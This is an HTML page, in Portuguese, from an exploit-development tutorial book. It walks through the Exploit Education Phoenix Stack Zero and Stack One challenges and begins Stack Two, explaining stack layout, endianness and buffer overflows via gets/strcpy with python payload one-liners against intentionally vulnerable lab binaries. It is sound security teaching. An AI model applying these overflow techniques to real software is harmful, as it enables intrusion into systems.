<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.3.</strong> SROP</a></li></ul></li><li><a href="./stack/ASLR/aslr.html"><strong>8.</strong> ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>8.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html"><strong>8.2.</strong> ret2plt</a></li><li><a href="./stack/ASLR/brute32.html"><strong>8.3.</strong> Bruteforce</a></li></ul></li><li><strong>9.</strong> Canary</li><li><strong>10.</strong> PIE</li><li><a href="./stack/leakAll.html"><strong>11.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>12.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>14.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>14.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><strong>15.</strong> Atacando Malloc</li><li><ul class="section"><li><strong>15.1.</strong> Básico</li><li><ul class="section"><li><strong>15.1.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>15.1.2.</strong> House of Force</a></li><li><strong>15.1.3.</strong> Unsafe Unlink</li><li><strong>15.1.4.</strong> Safe Unlink</li><li><strong>15.1.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>15.1.6.</strong> Chunk Faking</li></ul></li><li><strong>15.2.</strong> Intermediário</li><li><ul class="section"><li><strong>15.2.1.</strong> House of Orange</li><li><ul class="section"><li><strong>15.2.1.1.</strong> File Stream Exploitation</li><li><strong>15.2.1.2.</strong> Heap Extension</li><li><strong>15.2.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>15.2.2.</strong> House of Spirit</li></ul></li><li><strong>15.3.</strong> Avançado</li><li><ul class="section"><li><strong>15.3.1.</strong> House of Rust</li><li class="spacer"></li></ul></li></ul></li><li><a href="./linux_internals/linux.html"><strong>16.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>17.</strong> Prerequisitos</a></li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <a class="header" href="print.html#mapa" id="mapa"><h1>Mapa</h1></a>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<p>Recomendação:</p>
<pre><code>                    Stack                                   |
                      |                                     | Continuamente:
   ___________________|___________________                  | 
  |                   |                   |                 | Uma dose saudável 
  V                   V                   V                 | de fuzzing
Heap                Kernel        Outras Arquiteturas       | 
              ________|________                             | :D
             |                 |                            |
             V                 V                            |
            Win               Linux                         v
</code></pre>
<a class="header" href="print.html#stack" id="stack"><h2>Stack</h2></a>
<pre><code>Phoenix Stack:
BoF Tradicional, Assembly,... etc
     |__________ _______________ ____
     |          |               |    |        
     V          V               |    V
    W^X     GOT e PLT           | Canary
     |          |_________      V    |                 
     |          |         |    PIE   |
     V          V         V     |    |
  Ret2libC     ASLR     RELRO   |    |
     |          |               |    |
     |          V__ ____________V_ __V        
     |             |              |
     V             V              V
    ROP           Leak          Brute     
 ____|____     
|         |   
V         V   
SROP   ret2dl_resolve 
</code></pre>
<a class="header" href="print.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
<pre><code>Fuzz
  |
  |____________ ____________ 
  |            |            |
  V            V            V 
 Genético     Taint       Symbolic
  |           Analysis    Exec
  V            |______ _____|
 AFL+                 |
 ASAN                 | 
                      V
                    Angr

</code></pre>
<a class="header" href="print.html#heap-todo" id="heap-todo"><h2>Heap ~TODO~</h2></a>
<pre><code></code></pre>
<a class="header" href="print.html#linux-internals-todo" id="linux-internals-todo"><h2>Linux Internals ~TODO~</h2></a>
<pre><code></code></pre>
<a class="header" href="print.html#stack-1" id="stack-1"><h1>Stack</h1></a>
<p>Nesse capitulo vamos aprender sobre:</p>
<ul>
<li>Introdução a Assembly e conceitos relacionados!</li>
<li>Buffer Overflow Clássico</li>
<li>Mitigações comuns e como derrota-las:
<ul>
<li>W^X</li>
<li>ASLR</li>
<li>Canary</li>
<li>PIE</li>
<li>RELRO</li>
</ul>
</li>
<li>ROP Avançado </li>
</ul>
<p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong></p>
<p>Inspiracao (ingles):</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas é sobre o antigo: Protostar)</a></p>
<a class="header" href="print.html#-prerequisitos" id="-prerequisitos"><h1>🖥️ Prerequisitos:</h1></a>
<ul>
<li>Saber alguma linguagem de programação e conceitos relacionados</li>
</ul>
<a class="header" href="print.html#-opcional-mas-util-saber" id="-opcional-mas-util-saber"><h1>🐧 Opcional mas util saber</h1></a>
<ul>
<li>💾 Um pouco de C / C++ / Rust / Linguagem de nível baixo</li>
<li>🐍 Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>🐧 Saber o básico de Linux</li>
</ul>
<a class="header" href="print.html#-setup" id="-setup"><h1>🤖 Setup:</h1></a>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>NÂO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usuários/senha são: user/user e root/root</li>
<li>Os arquivos tão em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<ul>
<li><a href="print.html#-descri%C3%A7%C3%A3o">📝 Descrição</a></li>
<li><a href="print.html#-dica">💡 Dica</a></li>
<li><a href="print.html#conhecimento-preliminar">Conhecimento Preliminar</a>
<ul>
<li><a href="print.html#buffer">Buffer</a></li>
<li><a href="print.html#stack">Stack</a>
<ul>
<li><a href="print.html#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></li>
<li><a href="print.html#hex">Hex</a></li>
<li><a href="print.html#melhorando-o-exemplo-do-po%C3%A7o">Melhorando o exemplo do poço</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">🎉 Explicação</a>
<ul>
<li><a href="print.html#-1--alocando-as-vari%C3%A1veis-na-stack-buffer64-changeme">🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</a></li>
<li><a href="print.html#-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></li>
<li><a href="print.html#-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a>
<ul>
<li><a href="print.html#-64-as-changeme-n%C3%A3o-alterado">❌ 64 As, changeme não alterado</a></li>
<li><a href="print.html#-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></li>
<li><a href="print.html#%EF%B8%8F-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">👾 Solução</a></li>
</ul>
<a class="header" href="print.html#-descrição" id="-descrição"><h1>📝 Descrição</h1></a>
<p>Esse nível demonstra que memoria pode ser acessada fora da sua região
inicialmente alocada, como as variáveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
<p>Objetivo: Alterar a variável &quot;changeme&quot;</p>
<a class="header" href="print.html#-dica" id="-dica"><h1>💡 Dica</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<a class="header" href="print.html#conhecimento-preliminar" id="conhecimento-preliminar"><h1>Conhecimento Preliminar</h1></a>
<a class="header" href="print.html#buffer" id="buffer"><h2>Buffer</h2></a>
<p>Buffers são similares a arrays em outras linguagens de programação,
mas possuem tamanho fixo!</p>
<p>Eles são definidos usando: <code>tipo nome[tamanho]</code></p>
<p>O <code>tipo</code>, é do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possuírem tamanho fixo, são armazenados na stack!</p>
<a class="header" href="print.html#stack-2" id="stack-2"><h2>Stack</h2></a>
<p>A stack é uma porção da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando você quer colocar um novo, você coloca no topo da pilha (push)
Quando você quer pegar um da pilha, você pega o do topo (pop)

O ultimo a entrar, é o primeiro a sair...
o nome desse comportamento é LIFO (Last in First Out)
</code></pre>
<p><img src="./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<a class="header" href="print.html#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores"><h3>A stack cresce para valores menores</h3></a>
<pre><code>Imagina que ela é um poço que começa na profundidade 15

Quando você coloca um objeto de tamanho 2 no poço:
ele vai estar apoiado na profundidade 15, e vai até a profundidade 13

Em seguida, você coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai até a profundidade 10
</code></pre>
<p>Conforme você vai <strong>adicionando</strong> itens, o endereço que eles estão vai <strong>diminuindo</strong> em valor.
É meio confuso, mas com o tempo você pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endereços tão em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; é pra representar que o valor tá em hex).</p>
<a class="header" href="print.html#hex" id="hex"><h3>Hex</h3></a>
<p>Se vc não souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numeração hexadecimal</a>
. Mas resumindo, em hex você conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Então a base da stack é 0xFFFFFFFF e o topo 0X00000000 !</p>
<a class="header" href="print.html#melhorando-o-exemplo-do-poço" id="melhorando-o-exemplo-do-poço"><h3>Melhorando o exemplo do poço</h3></a>
<pre><code>0x0- 	     Topo da stack/Topo do poço
0xA ate 0x1- espaço vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do poço, primeiro item
</code></pre>
<a class="header" href="print.html#-explicação" id="-explicação"><h1>🎉 Explicação</h1></a>
<p>A função main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>🥞 Alocando as variáveis na stack (buffer[64], changeme)</li>
<li>💥 Alterar buffer[64] usando gets()</li>
<li>✅ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
            // Definir variáveis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nível faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela não deveria estar mudando!</p>
<p>Calma que você ja vai entender :)</p>
<a class="header" href="print.html#-1--alocando-as-variáveis-na-stack-buffer64-changeme" id="-1--alocando-as-variáveis-na-stack-buffer64-changeme"><h2>🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</h2></a>
<p>A variável <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A variável <code>changeme</code> esta marcada como <code>volátil</code> para prevenir que o compilador
destrua ela (pq originalmente não seria
alterada, então seria destruída para otimizar o código...
Mas nós vamos alterar ela por métodos... ~risada maléfica~ ... não convencionais hehehe).</p>
<p>Nossas duas variáveis (buffer[64] e changeme) são empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<a class="header" href="print.html#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets"><h2>💥 2- Alterar buffer[64] usando gets</h2></a>
<p>A função <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema é que ela <strong>não</strong> checa se o valor recebido é maior que o <code>buffer</code>, permitindo que
você <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai começar a escrever no topo do buffer (menor endereço)
e vai descendo até a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Então, caso colocássemos 100 &quot;A&quot;s no buffer de tamanho 64, as variáveis nos próximos 36 endereços seriam alteradas.</p>
<p>Essas variáveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; é 0x41, você pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usuário pode escrever fora memoria dele? perigoso ne! D:</p>
<p>É por isso que essa função está marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a variável <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<a class="header" href="print.html#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada"><h2>✅ 3- O programa checa se changeme foi alterada</h2></a>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, é vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na prática?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Então se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se você quer tentar resolver sozinhe, agora é a sua hora!

.
.
.
.
</code></pre>
<a class="header" href="print.html#-64-as-changeme-não-alterado" id="-64-as-changeme-não-alterado"><h3>❌ 64 As, changeme não alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<a class="header" href="print.html#-65-as-changeme-alterado" id="-65-as-changeme-alterado"><h3>✅ 65 As, changeme alterado</h3></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<a class="header" href="print.html#🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab"><h3>🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</h3></a>
<p>Para demonstrar melhor esse comportamento do buffer
ser escrito em um sentido específico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code></p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variável!! Uhhuuu :D</p>
<p>Esses As só pra encher a stack são chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explicação, mas relaxa que daqui pra frente fica mais difícil hehehe :D</p>
<p>Se você chegou até aqui, você ta de parabéns !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variáveis e no buffer, mostra o sentido que o
buffer escreve, e ele vazando e mudando o valor das outras variáveis...</p>
<a class="header" href="print.html#-solução" id="-solução"><h1>👾 Solução</h1></a>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="print.html#-dicas">💡 Dicas</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="print.html#input">Input</a></li>
<li><a href="print.html#endian">Endian</a>
<ul>
<li><a href="print.html#-dica-usando-valores-hex-diretamente">🌙 Dica: Usando valores hex diretamente</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<a class="header" href="print.html#-objetivo" id="-objetivo"><h1>🎯 Objetivo</h1></a>
<p>Agora o objetivo não é só alterar <code>changeme</code>, é alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois é, ele vai ser super util agora!</p>
<a class="header" href="print.html#-dicas" id="-dicas"><h1>💡 Dicas</h1></a>
<p>Ver a representação hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<a class="header" href="print.html#-explicação-1" id="-explicação-1"><h1>💫 Explicação</h1></a>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por trás das cenas é que as letras estão virando a sua representação hex.</p>
<p>Então <code>print(&quot;A&quot;*5)</code> é equivalente à <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta atenção no b&quot;&quot; : esse b indica que são Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de você usar valores arbitrários pra esses bytes,
então você pode usar o python2 (o print não tem parênteses, mas o resto é igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
                to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, então podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<a class="header" href="print.html#input" id="input"><h2>Input</h2></a>
<p>Nesse caso, o programa não ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
você executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>argv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc é a contagem: quantas coisas tem no argv! E aqui tá checando se é menor que 2!</p>
</blockquote>
<p>então no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos parênteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>então <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<a class="header" href="print.html#endian" id="endian"><h2>Endian</h2></a>
<p>O valor de changeme tem tamanho 4 bytes, pq ele é um integer (integers são 32 ou 64 bits, então 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os números são representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos dígitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros são representados em ordem decrescente CDU.</p>
</blockquote>
<blockquote>
<p>Em um sistema LE, os numeros são representados em ordem crescente UDC.</p>
</blockquote>
<pre><code>Por exemplo, o numero cento e vinte três:
BE: 123        
LE: 321
</code></pre>
<p>No dia a dia, nos humanos usamos o sistema BE, mas os computadores preferem LE, então eles invertem a ordem dos 4 bytes nos numeros inteiros!</p>
<p>Então pra gente conseguir que changeme seja <code>BCDE</code>, a gente precisa passar <code>EDCB</code> pro computador! :D</p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + 'EDCB'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x42434445, we want 0x496c5962
</code></pre>
<p>Isso quer dizer que pra gente definir <code>changeme = 49 6c 59 62</code>, e completar
o desafio, a gente precisa inverter a ordem dos bytes (<code>62 59 6c 49</code>)! :D</p>
<p>Mas eu não sei que letras são equivalentes a esses numeros... e nem todo numero tem uma letra!</p>
<a class="header" href="print.html#-dica-usando-valores-hex-diretamente" id="-dica-usando-valores-hex-diretamente"><h3>🌙 Dica: Usando valores hex diretamente</h3></a>
<p>Lembra que eu falei que letras são valores hex? A gente também pode usar os valores hex diretamente usando \x  :D</p>
<blockquote>
<p>Então usar b&quot;\x41&quot; é igual a b&quot;A&quot;!</p>
</blockquote>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'\x62\x59\x6c\x49'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Yay vitoria!</p>
<p>Caso você queira usar as letras, voce pode também!</p>
<p>Então <code>b'\x62\x59\x6c\x49'</code> é equivalente a <code>b'bYlI'</code></p>
<pre><code>$ ./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Mas e nos casos que o byte não tem um correspondente válido? Vc usa <code>&quot;\x&quot;</code> :D</p>
<p>Na verdade, é mais prático usar <code>\x</code> 99% das vezes, então vale a pena criar o habito!</p>
<a class="header" href="print.html#-solução-1" id="-solução-1"><h1>🔥 Solução</h1></a>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<ul>
<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">💫 Explicação</a>
<ul>
<li><a href="print.html#-environment-variable-vari%C3%A1vel-do-ambiente">🌳 Environment Variable (Variável do ambiente)</a></li>
<li><a href="print.html#overflow">Overflow</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">🔥 Solução</a></li>
</ul>
<a class="header" href="print.html#-objetivo-1" id="-objetivo-1"><h1>🎯 Objetivo</h1></a>
<p>Similar à anterior, a gente precisa mudar o valor da variável changeme,
mas dessa vez ao invés de usar o input ou argv, vamos usar env!</p>
<a class="header" href="print.html#-explicação-2" id="-explicação-2"><h1>💫 Explicação</h1></a>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
environment variable.</p>
<a class="header" href="print.html#-environment-variable-variável-do-ambiente" id="-environment-variable-variável-do-ambiente"><h2>🌳 Environment Variable (Variável do ambiente)</h2></a>
<p>Essas variáveis são acessíveis para todos os programas
executando naquela seção. E normalmente contem preferências como cores, o tipo de terminal, etcetc....</p>
<p>Você pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>Você pode definir uma até o resto da seção</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>Você pode definir uma somente para execução daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para nós, não faz tanta diferença se o input é pelas <code>envs</code> ou por outro método.</p>
<p>O único problema é que não podemos usar o Null Byte (0x00), pois ele é usado para indicar o final de uma string ASCII, portanto terminando nossa variável precocemente.</p>
<a class="header" href="print.html#overflow" id="overflow"><h2>Overflow</h2></a>
<p>Em seguida, o valor é copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A função <code>strcpy</code>, assim como <code>gets</code>, não checa se o valor é maior que o buffer, tornando o programa vulnerável... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em consideração que o sistema é LE: 0a 09 0a 0d</p>
</blockquote>
